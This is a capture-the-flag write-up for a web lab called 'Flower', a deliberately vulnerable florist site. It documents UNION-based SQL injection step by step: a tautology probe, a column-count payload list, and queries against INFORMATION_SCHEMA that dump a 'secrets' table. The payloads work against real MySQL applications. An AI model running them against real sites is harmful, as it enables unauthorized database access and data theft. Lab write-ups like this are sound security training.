# Flower

### Lab Link
[WebVerse - Flower](https://dashboard.webverselabs-pro.com/tracks/web-foundations/1/flower)

### Hint
SQL injection

---

> Flower Haven is a small neighborhood florist. They just went live with an online store over the weekend, built quickly, launched quickly, with nothing reviewed before it went up. The site is taking real orders now. Browse the catalog, try out the features, and pay attention to how the shop responds to what you give it.

---
### Analysis
First thing is we check the `url`, `request`, and `response` of all the category in the page if something can be exploited

![alt text](/Writeups/images/image6.png)

An interesting part is the `Home` page, as it contains a `title` `description` `price`. This is one of the common part to do an SQL Injection so we could see the content of the database.

![alt text](/Writeups/images/image7.png)

First is to try a basic SQLi to see what will the response be
```
' or '1'='1
```
Having a response 200 is good, but we also need to see if it shows the context.
![alt text](/Writeups/images/image.png)

---

### Enumeration
In this part where a lots or trial and error are needed using `Burpsuite or Caido` are much convenient as we can just insert the `payloads` we wanted to use, in this case I'll be using `Caido`

- Intercept
![alt text](/Writeups/images/image8.png)

- Send to Automate
![alt text](/Writeups/images/image-1.png)
![alt text](/Writeups/images/image-2.png)


#### Payload

Now we highlight the `text` we put in the search, then `+` for payload.

On the right window is where we will insert the Payloads.

![alt text](/Writeups/images/image-3.png)

First we need to know how many column there is and which column is visible in the webpage.

In here are the payloads I always try to have an idea on what type of SQLi I needed to use

```
Payloads

' union select 'abc', null, null, null, null-- -
' union select 'abc', null, null, null-- -
' union select 'abc', null, null-- -
' union select 'abc', null-- -
' union select 'abc'-- -
' union select 'abc', null, null, null, null--
' union select 'abc', null, null, null--
' union select 'abc', null, null--
' union select 'abc', null--
' union select 'abc'--
```

Now we run the payloads.

Important things to check are the `Status`, `Length`, and `Round-trip Time`

#### Notice in the result ID 2 has different Length which is longer
![alt text](/Writeups/images/image-4.png)

Response shows that webpage shows the content of the table, that identifies that the table has 4 columns
![alt text](/Writeups/images/image-5.png)
![alt text](/Writeups/images/image-6.png)

---

To know which exact column arrangement 

```
' union select 1,2,3,4-- -
```

![alt text](/Writeups/images/image-7.png)
![alt text](/Writeups/images/image-8.png)

---

## Going through the database
### The main goal is have an overview on the tables inside the database. As tables might stores username, email, address, and at this case is the `flag`
```
' union select 1,database(),3,4-- -
```
![alt text](/Writeups/images/image-9.png)

---
Now we show the names of the tables from the INFORMATION_SCHEMA.TABLES where the table_schema is our current database.
```
' union select 1,table_name,3,4 from INFORMATION_SCHEMA.TABLES where table_schema=database()-- -
```
![alt text](/Writeups/images/image-10.png)

We can now see a table name secrets.

```
' union select 1, COLUMN_NAME,3,4 from INFORMATION_SCHEMA.COLUMNS where table_name='secrets'-- -
```
![alt text](/Writeups/images/image-11.png)

#### Now that we know the name of the `table` and it's `column names` we can now proceed to take a look on that table directly

> Note: In MySQL, `backticks` are used to explicitly treat words as `column names` or `identifiers` rather than commands

```
' union select 1,`id`,`key`,`value` from secrets-- -
```

### `Now we got the flag`

![alt text](/Writeups/images/image-12.png)